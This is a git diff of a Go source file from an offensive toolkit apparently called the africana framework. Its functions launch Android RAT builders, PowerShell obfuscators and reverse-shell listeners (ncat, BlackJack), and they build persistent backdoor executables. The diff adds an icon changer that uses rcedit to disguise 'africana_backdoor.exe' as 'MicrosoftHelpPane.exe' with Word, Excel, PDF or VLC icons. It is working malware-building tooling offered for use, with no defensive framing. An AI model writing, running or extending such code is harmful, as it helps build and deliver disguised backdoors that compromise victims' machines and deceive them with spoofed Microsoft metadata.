@@ -43,113 +43,6 @@ func MeterPeter() {
     subprocess.Popen(`cd /root/.africana/africana-base/meterpeter/; pwsh meterpeter.ps1`)
 }
 
-func TearDroid() {
-    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "africana.apk" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-    userMalware, _ := reader.ReadString('\n')
-    userMalware = strings.TrimSpace(userMalware)
-    if userMalware == "" {
-        userMalware = "africana.apk"
-    }
-    subprocess.Popen(`cd /root/.africana/africana-base/teardroid/; python3 Teardroid.py -b %s`, userMalware)
-}
-
-func Chameleon() {
-    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Full path to your " + bcolors.PURPLE + ".Ps1" + bcolors.BLUE + ")" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-    fmt.Scan(&userScript)
-    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-    userOutput, _ := reader.ReadString('\n')
-    userOutput = strings.TrimSpace(userOutput)
-    if userOutput == "" {
-        userOutput = "/root/.africana/output/leviathan.txt"
-    }
-    subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; python3 chameleon.py -a %s -o %s`, userScript, userOutput)
-}
-
-func Gh0x0st() {
-    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Full path to your " + bcolors.PURPLE + ".Ps1" + bcolors.BLUE + ")" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-    fmt.Scan(&userScript)
-    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-    userOutput, _ := reader.ReadString('\n')
-    userOutput = strings.TrimSpace(userOutput)
-    if userOutput == "" {
-        userOutput = "/root/.africana/output/levuathan.txt"
-    }
-    subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)
-}
-
-func BlackJack() {
-    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "use " + bcolors.RED + "LISTENER " + bcolors.BLUE + "1. " + bcolors.YELLOW + "TCP " + bcolors.BLUE + "2. " + bcolors.YELLOW + "HTTPS " + bcolors.ENDC + "or " + bcolors.BLUE + "0. " + bcolors.YELLOW + bcolors.ITALIC + "Go back" + bcolors.BLUE + ")" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-    userInput, _ := reader.ReadString('\n')
-    userInput = strings.TrimSpace(userInput)
-    if userInput == "" {
-        userInput = "1"
-    }
-    switch userInput {
-    case "0":
-        return
-    case "1":
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-        userLport, _ := reader.ReadString('\n')
-        userLport = strings.TrimSpace(userLport)
-        if userLport == "" {
-            userLport = "9999"
-        }
-        banners.Banner()
-        subprocess.Popen(`cd /root/.africana/africana-base/blackjack/; python3 BlackJack.py -q -i -n %s`, userLport)
-    case "2":
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-        userLport, _ := reader.ReadString('\n')
-        userLport = strings.TrimSpace(userLport)
-        if userLport == "" {
-            userLport = "9999"
-        }
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "HPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "3333" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-        userHport, _ := reader.ReadString('\n')
-        userHport = strings.TrimSpace(userHport)
-        if userHport == "" {
-            userHport = "3333"
-        }
-        banners.Banner()
-        subprocess.Popen(`cd /root/.africana/africana-base/blackjack/; python3 BlackJack.py -q -i -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -x %s -n %s`, userLport, userHport)
-    default:
-        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
-    }
-}
-
-func PowerJoker() {
-    userLhostIp, err := utils.GetDefaultIP()
-    if err != nil {
-        fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
-        os.Exit(1)
-    }
-    fmt.Println()
-    subprocess.Popen(`ip address`)
-    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-    userLhost, _ := reader.ReadString('\n')
-    userLhost = strings.TrimSpace(userLhost)
-    if userLhost == "" {
-        userLhost = userLhostIp
-    }
-    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-    userLport, _ := reader.ReadString('\n')
-    userLport = strings.TrimSpace(userLport)
-    if userLport == "" {
-        userLport = "9999"
-    }
-    subprocess.Popen(`cd /root/.africana/africana-base/joker/; python3 joker.py -l %s -p %s`, userLhost, userLport)
-}
-
 func AndroRat() {
     userLhostIp, err := utils.GetDefaultIP()
     if err != nil {
@@ -194,6 +87,111 @@ func AndroRat() {
     banners.Banner()
     subprocess.Popen(`cd /root/.africana/africana-base/androrat/; python3 androrat.py --build -i %s -p %s -o %s`, userLhost, userLport, userOutput + userMalware + ".apk")
     subprocess.Popen(`cd /root/.africana/africana-base/androrat/; python3 androrat.py --shell -i %s -p %s`, userLhost, userLport)
+}
+
+func TearDroid() {
+    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "africana.apk" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    userMalware, _ := reader.ReadString('\n')
+    userMalware = strings.TrimSpace(userMalware)
+    if userMalware == "" {
+        userMalware = "africana.apk"
+    }
+    subprocess.Popen(`cd /root/.africana/africana-base/teardroid/; python3 Teardroid.py -b %s`, userMalware)
+}
+
+func Chameleon() {
+    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Full path to your " + bcolors.PURPLE + ".Ps1" + bcolors.BLUE + ")" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    fmt.Scan(&userScript)
+    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    userOutput, _ := reader.ReadString('\n')
+    userOutput = strings.TrimSpace(userOutput)
+    if userOutput == "" {
+        userOutput = "/root/.africana/output/leviathan.txt"
+    }
+    subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; python3 chameleon.py -a %s -o %s`, userScript, userOutput)
+}
+
+func Gh0x0st() {
+    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Full path to your " + bcolors.PURPLE + ".Ps1" + bcolors.BLUE + ")" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    fmt.Scan(&userScript)
+    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    userOutput, _ := reader.ReadString('\n')
+    userOutput = strings.TrimSpace(userOutput)
+    if userOutput == "" {
+        userOutput = "/root/.africana/output/levuathan.txt"
+    }
+    subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)
+}
+
+func PowerJoker() {
+    userLhostIp, err := utils.GetDefaultIP()
+    if err != nil {
+        fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
+        os.Exit(1)
+    }
+    fmt.Println()
+    subprocess.Popen(`ip address`)
+    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    userLhost, _ := reader.ReadString('\n')
+    userLhost = strings.TrimSpace(userLhost)
+    if userLhost == "" {
+        userLhost = userLhostIp
+    }
+    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    userLport, _ := reader.ReadString('\n')
+    userLport = strings.TrimSpace(userLport)
+    if userLport == "" {
+        userLport = "9999"
+    }
+    subprocess.Popen(`cd /root/.africana/africana-base/joker/; python3 joker.py -l %s -p %s`, userLhost, userLport)
+}
+
+func BlackJack() {
+    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "use " + bcolors.RED + "LISTENER " + bcolors.BLUE + "1. " + bcolors.YELLOW + "TCP " + bcolors.BLUE + "2. " + bcolors.YELLOW + "HTTPS " + bcolors.ENDC + "or " + bcolors.BLUE + "0. " + bcolors.YELLOW + bcolors.ITALIC + "Go back" + bcolors.BLUE + ")" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    userInput, _ := reader.ReadString('\n')
+    userInput = strings.TrimSpace(userInput)
+    if userInput == "" {
+        userInput = "1"
+    }
+    switch userInput {
+    case "0":
+        return
+    case "1":
+        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        userLport, _ := reader.ReadString('\n')
+        userLport = strings.TrimSpace(userLport)
+        if userLport == "" {
+            userLport = "9999"
+        }
+        subprocess.Popen(`cd /root/.africana/africana-base/blackjack/; python3 BlackJack.py -q -i -n %s`, userLport)
+    case "2":
+        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        userLport, _ := reader.ReadString('\n')
+        userLport = strings.TrimSpace(userLport)
+        if userLport == "" {
+            userLport = "9999"
+        }
+        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "HPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "3333" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        userHport, _ := reader.ReadString('\n')
+        userHport = strings.TrimSpace(userHport)
+        if userHport == "" {
+            userHport = "3333"
+        }
+        subprocess.Popen(`cd /root/.africana/africana-base/blackjack/; python3 BlackJack.py -q -i -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -x %s -n %s`, userLport, userHport)
+    default:
+        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
+    }
 }
 
 func ShikataGanai() {
@@ -375,7 +373,7 @@ func MalwareDll() {
     formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
     subprocess.Popen(formattedCmd)
 
-    log.Printf(bcolors.BLUE + "\n\nPersistent BackDoor: " + bcolors.ENDC + "Saved at " + bcolors.RED + "%s", endMalwarePath)
+    log.Printf(bcolors.BLUE + "\n\nPersistent BackDoor: " + bcolors.ENDC + "Saved at " + bcolors.RED + "%s", endMalwarePath + bcolors.ENDC)
 }
 
 func MalwareReg() {
@@ -404,18 +402,71 @@ func MalwareReg() {
     }
 
     runnerFilePath := "/root/.africana/output/malware_runner_reg.go"
-    endMalwarePath := "/root/.africana/output/africana_reg_backdoor.exe"
+    endMalwarePath := "/root/.africana/output/africana_backdoor.exe"
     fmt.Printf(bcolors.BLUE + "\nIntergrating Persistence Mechanisim: " + bcolors.ENDC + "in Malware!\n" + bcolors.DARKGREEN)
     buildCmd := "go build -v -x -o %s %s"
 
     formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
     subprocess.Popen(formattedCmd)
 
-    log.Printf(bcolors.BLUE + "\n\nPersistent BackDoor: " + bcolors.ENDC + "Saved at " + bcolors.RED + "%s", endMalwarePath)
+    log.Printf(bcolors.BLUE + "\n\nPersistent BackDoor: " + bcolors.ENDC + "Saved at " + bcolors.RED + "%s", endMalwarePath + bcolors.ENDC)
+}
+
+func IconChanger() {
+    fmt.Println()
+    fmt.Print(bcolors.BLUE + "[" + bcolors.ENDC + "+" + bcolors.BLUE + "] " + bcolors.ENDC + "Do you want to change Malware icon? " + bcolors.ENDC + "[y/n]: " + bcolors.ENDC)
+    userInput, _ := reader.ReadString('\n')
+    userInput = strings.TrimSpace(userInput)
+    if userInput == "" {
+        userInput = "y"
+    }
+    switch userInput {
+    case "n":
+        return
+    case "y":
+        menus.MenuFourSevenTwo()
+        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Icon " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "word.ico" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        userInput, _ := reader.ReadString('\n')
+        userInput = strings.TrimSpace(userInput)
+        if userInput == "" {
+            userInput = "11"
+        }
+        switch userInput {
+        case "0":
+            return
+        case "1":
+            subprocess.Popen(`wine /root/.africana/africana-base/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/payload_templates/icons/lync.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
+        case "2":
+            subprocess.Popen(`wine /root/.africana/africana-base/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/payload_templates/icons/excel.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
+        case "3":
+            subprocess.Popen(`wine /root/.africana/africana-base/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/payload_templates/icons/access.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
+        case "4":
+            subprocess.Popen(`wine /root/.africana/africana-base/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/payload_templates/icons/autorun.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
+        case "5":
+            subprocess.Popen(`wine /root/.africana/africana-base/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/payload_templates/icons/pdf.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
+        case "6":
+            subprocess.Popen(`wine /root/.africana/africana-base/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/payload_templates/icons/project.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
+        case "7":
+            subprocess.Popen(`wine /root/.africana/africana-base/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/payload_templates/icons/publisher.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
+        case "8":
+            subprocess.Popen(`wine /root/.africana/africana-base/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/payload_templates/icons/powerpoint.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
+        case "9":
+            subprocess.Popen(`wine /root/.africana/africana-base/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/payload_templates/icons/rat.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
+        case "10":
+            subprocess.Popen(`wine /root/.africana/africana-base/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/payload_templates/icons/vlc.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
+        case "11":
+            subprocess.Popen(`wine /root/.africana/africana-base/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/payload_templates/icons/word.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
+        case "12":
+            subprocess.Popen(`wine /root/.africana/africana-base/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/payload_templates/icons/visio.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
+        default:
+            fmt.Printf(bcolors.RED + "\n[-] " + bcolors.ENDC + "Unknown command: " + bcolors.DARKGREY + "%s. " + bcolors.ENDC + "Run the " + bcolors.DARKGREEN + "help " + bcolors.ENDC + "command for more details.\n", userInput + bcolors.ENDC)
+        }
+    }
 }
 
 func ListenerTcp() {
-    fmt.Printf(bcolors.ENDC + bcolors.ITALIC + "\n                Select a Listener to Launch:" + bcolors.ENDC)
+    fmt.Println(bcolors.BLUE + bcolors.ITALIC + "              " + bcolors.UNDERL + "Select a Listener to Launch:" + bcolors.ENDC)
     menus.MenuFourSevenOne()
     fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "CodeCracker " + bcolors.BLUE + ")" + bcolors.ENDC)
     fmt.Printf(bcolors.BLUE + "\n╰─🥥" + bcolors.GREEN + "❯ " + bcolors.ENDC)
@@ -427,6 +478,7 @@ func ListenerTcp() {
     switch strings.ToLower(userInput) {
     case "0", "e", "exit", "back":
         return
+
     case "1":
         userLhostIp, err := utils.GetDefaultIP()
         if err != nil {
@@ -449,15 +501,13 @@ func ListenerTcp() {
         if userLport == "" {
             userLport = "9999"
         }
-        fmt.Println(bcolors.ORANGE + `
-                 _.-;;-._
-          '-..-'|   ||   |
-          '-..-'|_.-;;-._|
-          '-..-'|   ||   |
-          '-..-'|_.-''-._|
-          ` + bcolors.DARKGREEN)
-        subprocess.Popen(`ncat -lnvp %s`, userLport)
+        banners.GraphicsMini()
+        subprocess.Popen(`rlwrap ncat -lnvp %s`, userLport)
+
     case "2":
+         BlackJack()
+
+    case "3":
         userLhostIp, err := utils.GetDefaultIP()
         if err != nil {
             fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
@@ -486,7 +536,7 @@ func ListenerTcp() {
 }
 
 func ListenerHttp() {
-    fmt.Printf(bcolors.DARKGREEN + "\nLaunching a Listener..." + bcolors.ENDC)
+    fmt.Println(bcolors.BLUE + bcolors.ITALIC + "              " + bcolors.UNDERL + "Select a Listener to Launch:" + bcolors.ENDC)
     menus.MenuFourSevenOne()
     fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Malware " + bcolors.ENDC + bcolors.ITALIC + "Select your " + bcolors.RED + "Choice" + bcolors.BLUE + ")" + bcolors.ENDC)
     fmt.Printf(bcolors.BLUE + "\n╰─🥥" + bcolors.GREEN + "❯ " + bcolors.ENDC)
@@ -494,6 +544,7 @@ func ListenerHttp() {
     switch userInput {
     case "0", "e", "E", "exit", "Exit", "EXIT", "back", "Back", "BACK":
         return
+
     case "1":
         userLhostIp, err := utils.GetDefaultIP()
         if err != nil {
@@ -516,15 +567,13 @@ func ListenerHttp() {
         if userLport == "" {
             userLport = "9999"
         }
-        fmt.Println(bcolors.ORANGE + `
-                 _.-;;-._
-          '-..-'|   ||   |
-          '-..-'|_.-;;-._|
-          '-..-'|   ||   |
-          '-..-'|_.-''-._|
-          ` + bcolors.DARKGREEN)
-        subprocess.Popen(`ncat --ssl --ssl-key /root/.africana/certs/africana-key.pem --ssl-cert /root/.africana/certs/africana-cert.pem %s`, userLport)
+        banners.GraphicsMini()
+        subprocess.Popen(`rlwrap ncat --ssl --ssl-key /root/.africana/certs/africana-key.pem --ssl-cert /root/.africana/certs/africana-cert.pem -lnvp %s`, userLport)
+
     case "2":
+         BlackJack()
+
+    case "3":
         userLhostIp, err := utils.GetDefaultIP()
         if err != nil {
             fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
@@ -554,7 +603,7 @@ func ListenerHttp() {
 
 func ListenerLauncher() {
     fmt.Println()
-    fmt.Print(bcolors.ENDC + `¯\_(ツ)_/¯ ` + bcolors.DARKCYAN + "🥥Do you want to launch a Listener... " + bcolors.YELLOW + "(y/n): " + bcolors.ENDC)
+    fmt.Print(bcolors.ENDC + `¯\_(ツ)_/¯ ` + bcolors.DARKCYAN + bcolors.ITALIC + "🥥Do you want to launch a Listener... " + bcolors.ENDC + "[y/n]: " + bcolors.ENDC)
     userInput, _ := reader.ReadString('\n')
     userInput = strings.TrimSpace(userInput)
     if userInput == "" {
@@ -589,12 +638,14 @@ func ListenerLauncher() {
 func NoiseMakers() {
     ShikataGanai    ()
     MalwareDll      ()
+    IconChanger     ()
     ListenerLauncher()
 }
 
 func CodeBreakers() {
     ShikataGanai    ()
     MalwareReg      ()
+    IconChanger     ()
     ListenerLauncher()
 }
 
